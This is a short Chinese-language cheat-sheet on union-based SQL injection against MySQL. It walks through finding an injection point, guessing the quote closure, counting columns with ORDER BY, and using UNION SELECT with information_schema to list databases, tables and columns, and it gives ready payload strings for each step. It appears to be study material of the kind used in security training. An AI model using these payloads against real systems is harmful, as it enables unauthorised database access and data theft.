# Sql 注入 (联合注入)

# Sql 注入基本步骤

# 判断是注入点 (有无回显)

id=1

# 通过报错判断闭合符（猜测）

id=1'

# 判断是字符型还是数字型

1' and 1=1 -- - 和 1' and 1=2 -- -

# 确认查询的字段数量

二分法 order by num -- -

# 确认回显占位信息

union select 1,2,3,...num -- -

# 查询数据

注意

需使用 -- - 或者 --+ 将后面注释

联合查询时 union 前应为假或空

常见函数：

@@version;(版本)

@@basedir;（存储位置）

database ()：当前网站使用的数据库

version ()：当前 MYSQL 使用的版本

user ()：当前 MYSQL 的用户

group_concat () 一次性显示

information_schema 记录有当前 mysql 下所有数据库名，表名，列名信息。

下列是存放各信息的名字:

information_schema 库

schemata 表

schema_name 为 mysql 中所有的数据库名字

tables 表
table_schema 为所属数据库的名字，对应的 tables_name 为表的名字

columns 表

table_schema 为所属数据库的名字，对应的 table_name 为所属表的名字，对应的 column_name 为列的名字。

# 获取库名

union select 1,2,database() -- -

# 获取表名

union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='sql'-- -

# 获取表字段

union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='sql' and table_name='users' -- -
